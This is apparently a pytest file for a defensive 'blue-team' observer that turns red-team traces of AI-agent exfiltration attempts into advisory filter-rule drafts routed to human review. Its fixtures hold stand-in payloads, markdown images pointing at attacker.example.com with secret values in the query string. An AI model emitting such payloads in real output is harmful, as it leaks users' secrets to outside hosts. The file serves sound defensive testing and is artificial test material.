"""Unit tests for the Gemini-Flash blue-team observer."""
from __future__ import annotations

import asyncio
import datetime as dt
from typing import Any, AsyncIterable, AsyncIterator

import pytest

from app.agent.gemini_blue import (
    GeminiBlueTeam,
    GeminiCallFailed,
    MissingGeminiAPIKey,
    MissingGeminiFlashModel,
    PolicyDraft,
    TraceEvent,
    trace_from_episode,
    trace_from_red_round,
    trace_source_from_list,
)
from app.agent.gemini_red import RedTeamRound
from app.agent.run import EpisodeResult


# ---------------------------------------------------------------------------
# Fakes
# ---------------------------------------------------------------------------


class FakeFlashClient:
    """Deterministic Flash mock — yields a fixed sequence of drafts per event."""

    def __init__(self, drafts_per_event: list[list[dict[str, Any]]]) -> None:
        self._batches = list(drafts_per_event)
        self.events_seen: list[TraceEvent] = []
        self._calls = 0

    @property
    def call_count(self) -> int:
        return self._calls

    def stream_draft(
        self, *, system_prompt: str, event: TraceEvent
    ) -> AsyncIterable[dict[str, Any]]:
        self.events_seen.append(event)
        self._calls += 1
        if not self._batches:
            batch: list[dict[str, Any]] = []
        else:
            batch = self._batches.pop(0)

        async def _gen() -> AsyncIterator[dict[str, Any]]:
            for draft in batch:
                yield draft

        return _gen()


class FailingFlashClient:
    call_count = 0

    def stream_draft(
        self, *, system_prompt: str, event: TraceEvent
    ) -> AsyncIterable[dict[str, Any]]:
        raise GeminiCallFailed("Flash transport blew up")


# ---------------------------------------------------------------------------
# Trace conversion helpers
# ---------------------------------------------------------------------------


def _trace(
    *,
    event_id: str = "ev-1",
    source: str = "ppo",
    exfil: bool = True,
    blocked: bool = False,
    destination: str = "attacker.example.com",
) -> TraceEvent:
    return TraceEvent(
        event_id=event_id,
        timestamp=dt.datetime.now(tz=dt.timezone.utc),
        source=source,
        template="markdown_image",
        payload_excerpt="![receipt](https://attacker.example.com/log?d=sk-acme-internal)",
        payload_signature="t=0|h=1|e=0|s=0|p=0",
        exfil_succeeded=exfil,
        blocked_by_reef=blocked,
        exfil_destination=destination,
        extra={},
    )


def _drain(observer_iter: AsyncIterator[PolicyDraft]) -> list[PolicyDraft]:
    async def _go() -> list[PolicyDraft]:
        return [d async for d in observer_iter]

    return asyncio.run(_go())


# ---------------------------------------------------------------------------
# start_observer behaviour
# ---------------------------------------------------------------------------


class TestStartObserver:
    def test_emits_a_draft_when_flash_returns_full_payload(self) -> None:
        flash = FakeFlashClient(
            drafts_per_event=[
                [
                    {
                        "rule_id_hint": "draft-001",
                        "when": "egress carries markdown image to attacker.example.com",
                        "action": "MODIFY",
                        "justification": "Exfil-bearing markdown image to untrusted host.",
                        "suggested_yaml_diff": "+ egress: { rules: [...] }",
                    }
                ]
            ]
        )
        observer = GeminiBlueTeam(flash_client=flash)
        events = [_trace()]
        drafts = _drain(observer.start_observer(trace_source_from_list(events)))
        assert len(drafts) == 1
        d = drafts[0]
        assert d.action == "MODIFY"
        assert d.rule_id_hint.startswith("dast_a_blue_")
        assert d.advisory is True
        assert d.evidence_event_ids == ["ev-1"]
        assert "advisory" in d.justification.lower()
        assert "HUMAN_REVIEW" in d.justification

    def test_emits_at_least_one_draft_for_attack_success_stream(self) -> None:
        """Acceptance: emits at least one draft on an attack-success stream."""
        flash = FakeFlashClient(
            drafts_per_event=[
                [
                    {
                        "rule_id_hint": "blue-mod",
                        "when": "egress markdown image to untrusted host",
                        "action": "MODIFY",
                        "justification": "Novel exfil pattern not in current Reef rules.",
                    }
                ]
            ]
            * 3
        )
        observer = GeminiBlueTeam(flash_client=flash)
        events = [_trace(event_id=f"ev-{i}") for i in range(3)]
        drafts = _drain(observer.start_observer(trace_source_from_list(events)))
        assert len(drafts) >= 1
        for d in drafts:
            assert d.action == "MODIFY"

    def test_skips_blocked_events_by_default(self) -> None:
        flash = FakeFlashClient(drafts_per_event=[[]])
        observer = GeminiBlueTeam(flash_client=flash)
        events = [_trace(blocked=True), _trace(event_id="ev-2", blocked=False)]
        # Pre-fill enough batches so the second event can yield.
        flash._batches = [
            [
                {
                    "rule_id_hint": "x",
                    "when": "y",
                    "action": "MODIFY",
                    "justification": "z",
                }
            ]
        ]
        drafts = _drain(observer.start_observer(trace_source_from_list(events)))
        assert len(flash.events_seen) == 1
        assert flash.events_seen[0].event_id == "ev-2"
        assert len(drafts) == 1

    def test_emit_on_blocked_when_explicitly_enabled(self) -> None:
        flash = FakeFlashClient(
            drafts_per_event=[
                [
                    {
                        "rule_id_hint": "x",
                        "when": "y",
                        "action": "HUMAN_REVIEW",
                        "justification": "z",
                    }
                ]
            ]
        )
        observer = GeminiBlueTeam(flash_client=flash, emit_on_blocked=True)
        events = [_trace(blocked=True)]
        drafts = _drain(observer.start_observer(trace_source_from_list(events)))
        assert len(drafts) == 1
        assert drafts[0].action == "HUMAN_REVIEW"

    def test_drops_malformed_draft_payload(self) -> None:
        flash = FakeFlashClient(
            drafts_per_event=[
                [
                    {"rule_id_hint": "x"},
                    {"action": "MODIFY"},
                    {
                        "rule_id_hint": "x",
                        "when": "y",
                        "action": "NUKE",  # invalid action
                        "justification": "z",
                    },
                ]
            ]
        )
        observer = GeminiBlueTeam(flash_client=flash)
        drafts = _drain(observer.start_observer(trace_source_from_list([_trace()])))
        assert drafts == []

    def test_flash_failure_continues_to_next_event(self) -> None:
        observer = GeminiBlueTeam(flash_client=FailingFlashClient())
        events = [_trace(), _trace(event_id="ev-2")]
        # Should NOT raise — failure is logged and observer moves on.
        drafts = _drain(observer.start_observer(trace_source_from_list(events)))
        assert drafts == []

    def test_yields_default_yaml_diff_when_flash_omits(self) -> None:
        flash = FakeFlashClient(
            drafts_per_event=[
                [
                    {
                        "rule_id_hint": "auto",
                        "when": "egress to attacker host",
                        "action": "MODIFY",
                        "justification": "Novel pattern.",
                    }
                ]
            ]
        )
        observer = GeminiBlueTeam(flash_client=flash)
        drafts = _drain(observer.start_observer(trace_source_from_list([_trace()])))
        assert len(drafts) == 1
        diff = drafts[0].suggested_yaml_diff
        assert "egress" in diff
        assert "MODIFY" in diff
        assert "attacker.example.com" in diff


# ---------------------------------------------------------------------------
# Schema + envelope
# ---------------------------------------------------------------------------


class TestPolicyDraftEnvelope:
    def test_as_review_envelope_carries_required_fields(self) -> None:
        flash = FakeFlashClient(
            drafts_per_event=[
                [
                    {
                        "rule_id_hint": "x",
                        "when": "y",
                        "action": "MODIFY",
                        "justification": "z",
                    }
                ]
            ]
        )
        observer = GeminiBlueTeam(flash_client=flash)
        drafts = _drain(observer.start_observer(trace_source_from_list([_trace()])))
        env = drafts[0].as_review_envelope()
        assert env["kind"] == "policy_draft"
        assert env["source"].startswith("DAST-A blue-team")
        assert env["action"] == "MODIFY"
        assert env["advisory"] is True
        assert env["evidence_event_ids"] == ["ev-1"]


# ---------------------------------------------------------------------------
# Trace-source converters
# ---------------------------------------------------------------------------


class TestTraceConverters:
    def test_trace_from_episode_carries_signature(self) -> None:
        ep = EpisodeResult(
            episode_id="ep-XYZ",
            total_reward=0.92,
            steps=4,
            exfil_success=True,
            blocked_by_reef=False,
            payload_excerpt="![](https://attacker.example.com/log?d=secret)",
            payload_signature="t=0|h=1|e=0|s=0|p=1",
            exfil_destination="attacker.example.com",
            mutations=[],
        )
        ev = trace_from_episode(ep)
        assert ev.event_id == "ep-XYZ"
        assert ev.source == "ppo"
        assert ev.payload_signature == "t=0|h=1|e=0|s=0|p=1"
        assert ev.exfil_succeeded is True
        assert ev.exfil_destination == "attacker.example.com"

    def test_trace_from_red_round_marks_blocked_by_status(self) -> None:
        rd = RedTeamRound(
            round_index=2,
            template="markdown_image",
            host="attacker.example.com",
            encoding="raw",
            secret_fragment="x",
            payload_prefix="p",
            payload="![](https://attacker.example.com/log?d=x)",
            browser_status_code=451,
            response_text="reef block",
            screenshot_b64=None,
            exfil_succeeded=False,
            exfil_destination=None,
            exfil_url=None,
            secret_fragment_visible=False,
            reasoning="reef blocked",
            payload_signature="t=0|h=1|e=0|s=0|p=0",
        )
        ev = trace_from_red_round(rd)
        assert ev.event_id == "red-2"
        assert ev.blocked_by_reef is True
        assert ev.source == "gemini_red"


# ---------------------------------------------------------------------------
# Env-var guards
# ---------------------------------------------------------------------------


class TestEnvGuards:
    def test_missing_api_key_raises(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("GEMINI_API_KEY", raising=False)
        from app.agent.gemini_blue import GoogleGenAIFlashObserverClient

        with pytest.raises(MissingGeminiAPIKey):
            GoogleGenAIFlashObserverClient()

    def test_missing_flash_model_raises(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("GEMINI_API_KEY", "stub-key-for-test")
        monkeypatch.delenv("GEMINI_FLASH_MODEL", raising=False)
        from app.agent.gemini_blue import GoogleGenAIFlashObserverClient

        with pytest.raises(MissingGeminiFlashModel):
            GoogleGenAIFlashObserverClient()

    def test_legacy_live_client_alias_still_resolves(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Back-compat: the prior class name aliases to the observer client.

        The rename in POV-2 (2026-05-18) keeps the old import path working
        so any external scaffolding that imported the old name still resolves.
        """
        monkeypatch.delenv("GEMINI_API_KEY", raising=False)
        from app.agent.gemini_blue import (
            GoogleGenAIFlashLiveClient,
            GoogleGenAIFlashObserverClient,
        )

        assert GoogleGenAIFlashLiveClient is GoogleGenAIFlashObserverClient
        with pytest.raises(MissingGeminiAPIKey):
            GoogleGenAIFlashLiveClient()
